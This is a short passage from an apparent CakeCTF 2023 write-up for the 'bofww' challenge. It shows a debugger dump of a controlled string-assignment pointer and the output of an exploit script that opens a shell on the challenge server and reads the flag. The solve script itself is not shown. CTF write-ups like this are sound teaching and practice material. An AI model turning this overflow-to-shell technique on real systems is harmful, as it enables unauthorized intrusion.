In:
```
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc@plt (
   $rdi = 0x00007fffffffde10 → "baadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadna[...]",
   $rsi = 0x00007fffffffdce0 → "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]",
   $rdx = 0x00007fffffffdce0 → "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
)
```
We can write to pointer stored in rdi, and pointer we can control with buffer overflow!

Output:
```
$ ./solve.py
[*] '<REDACTED>/bofww'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 5 cached gadgets for '<REDACTED>/bofww'
[+] Opening connection to bofww.2023.cakectf.com on port 9002: Done
What is your first name? 
How old are you? 
[*] Switching to interactive mode
$ ls
run
$ cd /
$ ls
app
bin
boot
dev
etc
flag-a46f1a1281627cf624c8933c130d5b7e.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag-a46f1a1281627cf624c8933c130d5b7e.txt
CakeCTF{<REDACTED>}
